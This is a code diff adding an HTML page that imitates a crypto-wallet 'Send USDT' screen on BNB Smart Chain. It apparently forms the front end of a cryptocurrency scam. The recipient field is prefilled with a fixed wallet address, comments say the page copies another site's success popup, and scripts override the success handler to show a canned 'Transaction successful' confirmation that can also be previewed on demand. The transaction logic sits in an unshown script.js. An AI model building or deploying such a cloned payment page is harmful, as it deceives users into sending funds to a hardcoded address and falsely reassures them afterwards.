@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <meta name="color-scheme" content="light dark">
+  <title>Send USDT</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <!-- Web3.js (Load First) -->
+  <script src="js/web3.min.js"></script>
+</head>
+<body>
+  <!-- Loading overlay (light/dark from scanner-manual) -->
+  <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+    <div class="loading-spinner-container">
+      <div class="loading-spinner"></div>
+      <p class="loading-text">Processing...</p>
+    </div>
+  </div>
+
+  <main class="container">
+    <h1 class="title">Send USDT</h1>
+
+    <label class="label" for="address">Address or Domain Name</label>
+    <div class="input-group address-input-group">
+      <input type="text" id="address" placeholder="Search or Enter" value="0x53d6f1967d89291a92F185CCc744024d50E8c744">
+      <button class="text-btn">Paste</button>
+      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
+      <button class="icon-btn"><i class="fas fa-expand"></i></button>
+    </div>
+
+    <label class="label" for="destinationNetwork">Destination network</label>
+    <div class="network-select">
+      <div class="network-icon">
+        <img src="cropped_circle_image.png" alt="BNB Smart Chain" class="bnb-logo-img">
+      </div>
+      <span class="network-text">BNB Smart Chain</span>
+      <i class="fas fa-chevron-down network-arrow"></i>
+    </div>
+
+    <label class="label" for="amount">Amount</label>
+    <div class="input-group amount-input-group">
+      <input type="number" id="amount" placeholder="USDT Amount">
+      <span class="unit">USDT</span>
+      <button class="max-btn">Max</button>
+    </div>
+
+    <p class="estimate" id="estimate">≈ $0.00</p>
+
+    <button id="verifyBtn" class="next-btn" disabled>Next</button>
+    <p class="preview-hint"><button type="button" id="previewPopupBtn" class="preview-btn">Preview success popup</button></p>
+  </main>
+
+  <!-- Success popup (sendbnb.li same-to-same): bottom sheet, 3D checkmark, Transaction details -->
+  <div id="successModal" class="success-modal" aria-hidden="true">
+    <div class="success-modal__backdrop"></div>
+    <div class="success-modal__sheet">
+      <button type="button" class="success-modal__close" aria-label="Close">&times;</button>
+      <div class="success-modal__graphic">
+        <svg class="success-modal__icon" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <!-- Wireframe sphere (sendbnb.li: light blue/white globe) -->
+          <circle cx="60" cy="60" r="52" stroke="rgba(180, 220, 255, 0.4)" stroke-width="1.5" fill="none"/>
+          <ellipse cx="60" cy="60" rx="52" ry="26" stroke="rgba(180, 220, 255, 0.3)" stroke-width="1" fill="none"/>
+          <ellipse cx="60" cy="60" rx="26" ry="52" stroke="rgba(180, 220, 255, 0.3)" stroke-width="1" fill="none"/>
+          <line x1="8" y1="60" x2="112" y2="60" stroke="rgba(200, 230, 255, 0.25)" stroke-width="1"/>
+          <line x1="60" y1="8" x2="60" y2="112" stroke="rgba(200, 230, 255, 0.25)" stroke-width="1"/>
+          <!-- Particles (green + blue) -->
+          <circle cx="28" cy="35" r="2" fill="rgba(73, 230, 120, 0.9)"/>
+          <circle cx="92" cy="48" r="1.5" fill="rgba(73, 230, 120, 0.7)"/>
+          <circle cx="35" cy="88" r="1.5" fill="rgba(73, 230, 120, 0.6)"/>
+          <circle cx="85" cy="78" r="2" fill="rgba(100, 200, 255, 0.6)"/>
+          <circle cx="50" cy="28" r="1" fill="rgba(180, 220, 255, 0.8)"/>
+          <circle cx="72" cy="92" r="1" fill="rgba(180, 220, 255, 0.6)"/>
+          <!-- Checkmark: green with blue stripe (sendbnb.li 3D style) -->
+          <defs>
+            <linearGradient id="checkGrad" x1="0%" y1="0%" x2="100%" y2="0%">
+              <stop offset="0%" stop-color="#00c758"/>
+              <stop offset="45%" stop-color="#49e678"/>
+              <stop offset="55%" stop-color="#49e678"/>
+              <stop offset="70%" stop-color="#4da6ff"/>
+              <stop offset="100%" stop-color="#49e678"/>
+            </linearGradient>
+          </defs>
+          <path d="M32 60 L50 78 L88 38" stroke="url(#checkGrad)" stroke-width="10" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h2 class="success-modal__title">Transaction successful!</h2>
+      <p class="success-modal__desc">Your transaction has been confirmed. Blockchain validation complete.</p>
+      <a id="successModalDetailsBtn" href="https://bscscan.com/" target="_blank" rel="noopener" class="success-modal__btn">Transaction details</a>
+    </div>
+  </div>
+
+  <!-- Custom script after Web3 -->
+  <script src="js/script.js"></script>
+
+  <!-- Optional: sync our loading overlay with script's showLoading/hideLoading -->
+  <script>
+    (function () {
+      var overlay = document.getElementById("loadingOverlay");
+      if (!overlay) return;
+      var origShow = window.showLoading;
+      var origHide = window.hideLoading;
+      if (typeof origShow === "function") {
+        window.showLoading = function (msg) {
+          if (overlay) { overlay.style.display = "flex"; var t = overlay.querySelector(".loading-text"); if (t && msg) t.textContent = msg; }
+          return origShow.apply(this, arguments);
+        };
+      }
+      if (typeof origHide === "function") {
+        window.hideLoading = function () {
+          if (overlay) overlay.style.display = "none";
+          return origHide.apply(this, arguments);
+        };
+      }
+    })();
+  </script>
+
+  <!-- Override success popup: show sendbnb.li-style bottom sheet on transaction success -->
+  <script>
+    (function () {
+      var modal = document.getElementById("successModal");
+      if (!modal) return;
+      var closeBtn = modal && modal.querySelector(".success-modal__close");
+      var backdrop = modal && modal.querySelector(".success-modal__backdrop");
+      var detailsBtn = document.getElementById("successModalDetailsBtn");
+
+      function openSuccessModal() {
+        var oldPopup = document.getElementById("successPopup");
+        if (oldPopup) oldPopup.style.display = "none";
+        if (modal) {
+          requestAnimationFrame(function () {
+            modal.classList.add("is-open");
+            modal.setAttribute("aria-hidden", "false");
+          });
+        }
+      }
+      function closeSuccessModal() {
+        if (modal) {
+          modal.classList.remove("is-open");
+          modal.setAttribute("aria-hidden", "true");
+        }
+      }
+
+      if (closeBtn) closeBtn.addEventListener("click", closeSuccessModal);
+      if (backdrop) backdrop.addEventListener("click", closeSuccessModal);
+
+      var previewBtn = document.getElementById("previewPopupBtn");
+      if (previewBtn) previewBtn.addEventListener("click", openSuccessModal);
+
+      var originalShowSuccess = window.showSuccess;
+      if (typeof originalShowSuccess === "function") {
+        window.showSuccess = function (message) {
+          openSuccessModal();
+        };
+      }
+    })();
+  </script>
+
+  <!-- ✅ Add event listener to call `Next()` -->
+  <script>
+    document.getElementById("verifyBtn").addEventListener("click", Next);
+  </script>
+  <!-- Update USD estimate and Next button: no amount = light blue (disabled), valid amount = dark blue (enabled) -->
+  <script>
+    (function () {
+      var amountInput = document.getElementById("amount");
+      var estimateEl = document.getElementById("estimate");
+      var nextBtn = document.getElementById("verifyBtn");
+      function updateEstimateAndButton() {
+        var raw = amountInput.value.replace(/^\s+|\s+$/g, "");
+        var num = parseFloat(raw) || 0;
+        var value = Math.abs(num);
+        estimateEl.textContent = "≈ $" + value.toFixed(2);
+        if (nextBtn) {
+          if (value > 0) {
+            nextBtn.removeAttribute("disabled");
+          } else {
+            nextBtn.setAttribute("disabled", "disabled");
+          }
+        }
+      }
+      amountInput.addEventListener("input", updateEstimateAndButton);
+      amountInput.addEventListener("change", updateEstimateAndButton);
+      updateEstimateAndButton();
+    })();
+  </script>
+</body>
+</html>
